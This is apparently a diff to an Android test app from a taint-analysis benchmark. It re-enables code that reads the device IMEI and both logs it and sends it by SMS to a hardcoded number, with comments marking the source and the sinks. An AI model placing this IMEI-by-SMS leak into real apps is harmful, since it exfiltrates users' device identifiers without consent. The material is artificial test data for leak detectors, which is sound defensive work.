@@ -34,9 +34,9 @@ public class Button2 extends Activity {
 		    @Override
 		    public void onClick(View v) {
 		    	
-		    	//SmsManager sm = SmsManager.getDefault();
-		    	//String number = "+49 1234";
-		    	//sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
+		    	SmsManager sm = SmsManager.getDefault();
+		    	String number = "+49 1234";
+		    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
 		        Log.i("TAG", "sendIMEI: " + imei); //sink, potential leak
 		        
 		        imei = "";
@@ -44,19 +44,19 @@ public class Button2 extends Activity {
 		});
 		
 		
-		/*Button button2= (Button) findViewById(R.id.button2);
+		Button button2= (Button) findViewById(R.id.button2);
 		button2.setOnClickListener(new View.OnClickListener() {
 		    @Override
 		    public void onClick(View v) {
 		        imei = "";
 		        Log.i("TAG", "Button 2: " + imei); //sink, no leak
 		    }
-		});*/
+		});
     }
 
     public void clickOnButton3(View view){
 		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
 		imei = telephonyManager.getDeviceId(); //source
-		//Log.i("TAG", "Button3: " + imei); //sink, leak
+		Log.i("TAG", "Button3: " + imei); //sink, leak
 	}
 }
